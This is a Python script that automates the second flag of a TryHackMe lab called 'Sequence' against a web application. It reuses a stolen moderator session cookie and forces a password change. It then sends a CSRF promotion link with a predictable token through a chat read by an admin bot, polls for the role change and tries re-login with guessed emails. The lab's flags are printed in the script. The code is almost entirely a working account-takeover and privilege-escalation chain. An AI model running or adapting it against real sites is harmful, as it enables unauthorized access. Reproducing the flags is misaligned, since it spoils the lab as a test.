#!/usr/bin/env python3
"""
THM Sequence - Flag 2 automation.

Realistic path for this room:
1) Use mod session
2) Change mod password (so re-login is possible)
3) Send promote link to admin via chat.php
4) Wait until dashboard user table shows mod role changed to admin
5) Optional: re-login with --login-email to fetch flag 2 in a fresh session

Usage examples:
    # DNS target is often better for chat-bot link handling:
    python sequence_second_flag.py --phpsessid <MOD_SID> --target http://review.thm
    python sequence_second_flag.py --phpsessid <MOD_SID> --target http://review.thm --timeout 300
    python sequence_second_flag.py --phpsessid <MOD_SID> --target http://review.thm --auto-login
    python sequence_second_flag.py --phpsessid <MOD_SID> --target http://review.thm --login-email mod@review.thm


     THM{Adm1NPawned007}
"""

import argparse
import hashlib
import re
import sys
import time
import os

import requests

TARGET = "http://10.82.129.17"
PROMOTE_BASE = "http://review.thm"
MOD_USER = "mod"
NEW_PASSWORD = "Pwned1337!"
FLAG1_KNOWN = "THM{M0dH@ck3dPawned007}"
CSRF_PROMOTE = hashlib.md5(b"admin").hexdigest()

SID_FILE = "mod_sid.txt"

def extract_flags(text):
    return re.findall(r"THM\{[^}]+\}", text or "")


def get_settings_csrf(session):
    try:
        r = session.get(f"{TARGET}/settings.php", timeout=10, allow_redirects=True)
    except Exception:
        return None
    if "login" in r.url:
        return None
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else None


def resolve_phpsessid(cli_sid):
    if cli_sid:
        return cli_sid.strip()

    env_sid = os.getenv("THM_MOD_SID", "").strip()
    if env_sid:
        return env_sid

    sid_path = os.path.join(os.path.dirname(__file__), SID_FILE)
    try:
        with open(sid_path, "r", encoding="utf-8") as fh:
            file_sid = fh.read().strip()
            if file_sid:
                return file_sid
    except OSError:
        pass

    return None


def change_password(session, csrf_token):
    try:
        r = session.post(
            f"{TARGET}/update_password.php",
            data={"new_password": NEW_PASSWORD, "csrf_token": csrf_token},
            timeout=10,
            allow_redirects=True,
        )
    except Exception:
        return False
    return "password updated" in r.text.lower() or r.status_code == 200


def post_chat_message(session, message):
    try:
        r = session.post(
            f"{TARGET}/chat.php",
            data={"message": message},
            timeout=10,
            allow_redirects=True,
        )
        return r.status_code == 200
    except Exception:
        return False


def parse_mod_role(html):
    rows = re.findall(r"<tr>.*?</tr>", html or "", re.I | re.S)
    for row in rows:
        cols = re.findall(r"<t[dh][^>]*>\s*([^<]+?)\s*</t[dh]>", row, re.I | re.S)
        cols = [c.strip().lower() for c in cols]
        if len(cols) >= 3 and cols[1] == "mod":
            return cols[2]
    return None


def poll_status(session, timeout, interval, known_flag1):
    deadline = time.time() + timeout
    attempt = 0
    while time.time() < deadline:
        attempt += 1
        try:
            dash = session.get(f"{TARGET}/dashboard.php", allow_redirects=True, timeout=10)
        except Exception as exc:
            print(f"  [poll {attempt}] request error on dashboard.php: {exc}")
            time.sleep(interval)
            continue
        if "login" in dash.url:
            print(f"  [poll {attempt}] Session expired during dashboard check.")
            return None, None

        role = parse_mod_role(dash.text)
        flags = extract_flags(dash.text)
        flag2 = next((f for f in flags if f != known_flag1), None)

        print(f"  [poll {attempt}] mod role={role or 'unknown'} flags={flags}")
        if role == "admin":
            return role, flag2

        remaining = int(deadline - time.time())
        print(f"  [poll {attempt}] waiting {interval}s ({remaining}s left)")
        time.sleep(interval)
    return None, None


def try_relogin(login_email):
    s = requests.Session()
    try:
        r = s.post(
            f"{TARGET}/login.php",
            data={"email": login_email, "password": NEW_PASSWORD},
            timeout=10,
            allow_redirects=True,
        )
    except Exception as exc:
        print(f"[!] Re-login request failed: {exc}")
        return None, None

    if "login" in r.url:
        return None, None

    try:
        dash = s.get(f"{TARGET}/dashboard.php", allow_redirects=True, timeout=10)
    except Exception:
        return s, None
    flags = extract_flags(dash.text)
    flag2 = next((f for f in flags if f != FLAG1_KNOWN), None)
    return s, flag2


def get_login_candidates(user_supplied=None):
    candidates = []
    if user_supplied:
        candidates.append(user_supplied)

    # Common patterns seen in this room family.
    candidates.extend(
        [
            "mod@review.thm",
            "mod@review.local",
            "mod@localhost",
            "mod",
            "software@review.thm",
            "product@review.thm",
            "admin@review.thm",
        ]
    )

    # De-duplicate while preserving order.
    deduped = []
    seen = set()
    for item in candidates:
        if item and item not in seen:
            seen.add(item)
            deduped.append(item)
    return deduped


def try_relogin_candidates(user_supplied=None):
    candidates = get_login_candidates(user_supplied)
    print(f"[3] Trying automatic re-login candidates ({len(candidates)})")
    for email in candidates:
        print(f"  - trying {email}")
        sess, flag2 = try_relogin(email)
        if not sess:
            continue

        # Login worked even if flag is not visible yet.
        if flag2:
            return email, flag2

        try:
            r = sess.get(f"{TARGET}/dashboard.php", allow_redirects=True, timeout=10)
            flags = extract_flags(r.text)
            flag2_now = next((f for f in flags if f != FLAG1_KNOWN), None)
            if flag2_now:
                return email, flag2_now
        except Exception:
            pass
    return None, None


def main():
    global TARGET
    parser = argparse.ArgumentParser(description="THM Sequence - Flag 2")
    parser.add_argument("--phpsessid", help="Fresh mod PHPSESSID (optional if THM_MOD_SID or mod_sid.txt exists)")
    parser.add_argument("--target", default=TARGET, help="Base URL of target app (default: http://10.82.129.17)")
    parser.add_argument("--promote-base", default=PROMOTE_BASE, help="Host used in chat promote URL (default: http://review.thm)")
    parser.add_argument("--timeout", type=int, default=150, help="Poll timeout for flag 2 (default: 150)")
    parser.add_argument("--poll-interval", type=int, default=10, help="Poll interval seconds (default: 10)")
    parser.add_argument("--known-flag1", default=FLAG1_KNOWN, help="Known first flag to exclude")
    parser.add_argument("--login-email", help="Optional email for final re-login to reveal Flag 2")
    parser.add_argument("--auto-login", action="store_true", help="Try automatic login-email candidates after role escalation")
    args = parser.parse_args()

    TARGET = args.target.rstrip("/")
    phpsessid = resolve_phpsessid(args.phpsessid)
    if not phpsessid:
        print("[!] No PHPSESSID provided.")
        print("    Use --phpsessid <SID>, set THM_MOD_SID, or create mod_sid.txt next to this script.")
        sys.exit(1)

    print(f"Target      : {TARGET}")
    print(f"PHPSESSID   : {phpsessid}")
    print(f"PromoteHost : {args.promote_base.rstrip('/')}")

    s = requests.Session()
    s.cookies.set("PHPSESSID", phpsessid)

    try:
        check = s.get(f"{TARGET}/dashboard.php", allow_redirects=True, timeout=10)
    except Exception as exc:
        print(f"[!] Initial session check failed: {exc}")
        sys.exit(1)
    if "login" in check.url:
        print("[!] Session expired. Get a fresh mod session first.")
        sys.exit(1)
    print("Session valid")

    print(f"\n[1] Set known mod password: {NEW_PASSWORD}")
    csrf = get_settings_csrf(s)
    if not csrf:
        print("[!] Could not read settings CSRF token (session likely stale).")
        sys.exit(1)
    pw_ok = change_password(s, csrf)
    print(f"  update_password.php: {'ok' if pw_ok else 'FAIL'}")

    promote_base = args.promote_base.rstrip("/")
    promote_url = f"{promote_base}/promote_coadmin.php?username={MOD_USER}&csrf_token_promote={CSRF_PROMOTE}"
    print("\n[2] Sending promote link once via chat.php")
    print(f"  promote URL: {promote_url}")

    ok = post_chat_message(s, promote_url)
    print(f"  [chat 001] {'ok' if ok else 'FAIL'}")

    print(f"\n[3] Waiting for admin click (polling up to {args.timeout}s)")
    role, inline_flag2 = poll_status(
        s,
        timeout=args.timeout,
        interval=args.poll_interval,
        known_flag1=args.known_flag1,
    )

    if role != "admin":
        print("[!] mod role did not change to admin within timeout.")
        print("    Re-run once with a fresh session and wait for bot processing.")
        sys.exit(1)

    print("\n[+] Role escalation confirmed: mod -> admin")
    if inline_flag2:
        print("\n" + "=" * 52)
        print(f"FLAG 2: {inline_flag2}")
        print("=" * 52)
        return

    print("[i] Flag 2 not visible in current session yet (normal).")
    if args.auto_login or args.login_email:
        used_email, relog_flag2 = try_relogin_candidates(args.login_email)
        if not relog_flag2:
            print("[!] Role is admin but Flag 2 not found via auto re-login yet.")
            print("    Retry with a known exact email using --login-email.")
            return
        print(f"[+] Re-login succeeded with: {used_email}")
        print("\n" + "=" * 52)
        print(f"FLAG 2: {relog_flag2}")
        print("=" * 52)
        return

    print("[i] Use --auto-login (or --login-email) to fetch Flag 2 after role flip.")


if __name__ == "__main__":
    main()

